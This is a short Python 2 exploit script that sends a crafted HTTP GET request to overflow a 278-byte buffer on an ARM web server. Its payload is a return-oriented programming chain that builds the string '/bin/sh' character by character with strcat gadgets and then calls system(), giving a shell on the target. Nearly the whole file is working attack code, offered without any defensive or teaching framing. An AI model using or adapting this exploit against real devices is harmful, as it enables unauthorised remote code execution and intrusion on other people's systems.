#! /usr/bin/python
import struct

exploit = ""

bufsize = 278	# number of junk bytes to fill buffer with

command = "/bin/sh" # command we wish to execute

exploit += "GET "				# 
exploit += 'A' * bufsize			# fill string with junk
exploit += struct.pack("<I", 0x0804184c)	# pop	r3, lr
exploit += 'A' * 4				# r3 -> JUNK
exploit += struct.pack("<I", 0x08041a14)	# lr -> pop r3, pc
						# bx lr
						# pop	r3, pc
exploit += struct.pack("<I", 0x08049de8)	# r3 -> .bss segment
exploit += struct.pack("<I", 0x08041854)	# mov	r0, r3
						# pop	r11, pc
exploit += 'A' * 4				# r11 -> JUNK
exploit += struct.pack("<I", 0x08041a14)	# pop	r3, pc
exploit += struct.pack("<I", 0x080413bc)	# r3 -> "/"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "/")
						# pop	r3, pc
exploit += struct.pack("<I", 0x08041c24)	# r3 -> "b"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "b")
						# pop	r3, pc
exploit += struct.pack("<I", 0x08041c28)	# r3 -> "i"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "i")
						# pop	r3, pc
exploit += struct.pack("<I", 0x08041a3d)	# r3 -> "n"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "n")
						# pop	r3, pc
exploit += struct.pack("<I", 0x080413bc)	# r3 -> "/"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "/")
						# pop	r3, pc
exploit += struct.pack("<I", 0x08041c1d)	# r3 -> "s"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "s")
						# pop	r3, pc
exploit += struct.pack("<I", 0x08041c2c)	# r3 -> "h"
exploit += struct.pack("<I", 0x08041860)	# mov	r1, r3
						# pop	fp, pc
exploit += 'A' * 4				# fp -> JUNK
exploit += struct.pack("<I", 0x08041940)	# strcat(.bss, "h")
						# pop	r3, pc

# call system() with the command built
exploit += 'A' * 4				# r3 -> JUNK
exploit += struct.pack("<I", 0x080419c8)	# system(command)

exploit += " HTTP/1.1" 

print exploit
